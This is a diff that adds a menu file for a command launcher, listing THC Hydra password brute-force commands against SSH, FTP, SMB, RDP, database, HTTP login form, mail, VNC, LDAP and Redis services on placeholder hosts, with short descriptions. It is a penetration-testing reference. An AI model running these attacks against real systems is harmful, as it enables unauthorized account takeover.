@@ -1,0 +1,100 @@
+# Hydra Command List
+# Format: [\] command [/] description [X] menutitlename
+
+[X] Hydra Command List
+
+[\] hydra -L users.txt -P pass.txt ssh://192.168.1.10
+[/] Brute‑force SSH with user and password lists
+
+[\] hydra -l admin -P pass.txt ssh://192.168.1.10
+[/] SSH brute‑force with single username
+
+[\] hydra -L users.txt -p password ssh://192.168.1.10
+[/] SSH brute‑force with single password
+
+[\] hydra -V -L users.txt -P pass.txt ssh://host
+[/] Verbose SSH brute‑force
+
+[\] hydra -t 4 -L users.txt -P pass.txt ssh://host
+[/] Set number of parallel threads
+
+[\] hydra -s 2222 -L users.txt -P pass.txt ssh://host
+[/] SSH brute‑force on custom port
+
+[\] hydra -L users.txt -P pass.txt ftp://192.168.1.10
+[/] FTP brute‑force
+
+[\] hydra -l admin -P pass.txt ftp://host
+[/] FTP with single username
+
+[\] hydra -L users.txt -P pass.txt smb://192.168.1.10
+[/] SMB brute‑force
+
+[\] hydra -L users.txt -P pass.txt rdp://192.168.1.10
+[/] RDP brute‑force
+
+[\] hydra -L users.txt -P pass.txt mysql://192.168.1.10
+[/] MySQL brute‑force
+
+[\] hydra -L users.txt -P pass.txt postgres://192.168.1.10
+[/] PostgreSQL brute‑force
+
+[\] hydra -L users.txt -P pass.txt mssql://192.168.1.10
+[/] MSSQL brute‑force
+
+[\] hydra -L users.txt -P pass.txt http-get://host/
+[/] HTTP GET authentication brute‑force
+
+[\] hydra -L users.txt -P pass.txt http-head://host/
+[/] HTTP HEAD authentication brute‑force
+
+[\] hydra -L users.txt -P pass.txt http-post-form://host/login.php:user=^USER^&pass=^PASS^:F=incorrect
+[/] HTTP POST form brute‑force
+
+[\] hydra -l admin -P pass.txt http-post-form://host/login.php:username=^USER^&password=^PASS^:S=success
+[/] POST form brute‑force with success condition
+
+[\] hydra -L users.txt -P pass.txt http-form-post://host/login
+[/] Generic HTTP form brute‑force
+
+[\] hydra -L users.txt -P pass.txt vnc://192.168.1.10
+[/] VNC brute‑force
+
+[\] hydra -L users.txt -P pass.txt telnet://192.168.1.10
+[/] Telnet brute‑force
+
+[\] hydra -L users.txt -P pass.txt smtp://192.168.1.10
+[/] SMTP brute‑force
+
+[\] hydra -L users.txt -P pass.txt pop3://192.168.1.10
+[/] POP3 brute‑force
+
+[\] hydra -L users.txt -P pass.txt imap://192.168.1.10
+[/] IMAP brute‑force
+
+[\] hydra -L users.txt -P pass.txt ldap2://192.168.1.10
+[/] LDAP brute‑force
+
+[\] hydra -L users.txt -P pass.txt redis://192.168.1.10
+[/] Redis brute‑force
+
+[\] hydra -C creds.txt ssh://192.168.1.10
+[/] Use combined username:password file
+
+[\] hydra -e nsr -L users.txt -P pass.txt ssh://host
+[/] Try null, same-as-user, and reversed passwords
+
+[\] hydra -f -L users.txt -P pass.txt ssh://host
+[/] Stop after first valid login
+
+[\] hydra -o results.txt -L users.txt -P pass.txt ssh://host
+[/] Save successful logins to file
+
+[\] hydra -I -L users.txt -P pass.txt ssh://host
+[/] Ignore previous restore file
+
+[\] hydra -R
+[/] Restore last interrupted session
+
+[\] hydra -h
+[/] Show help menu
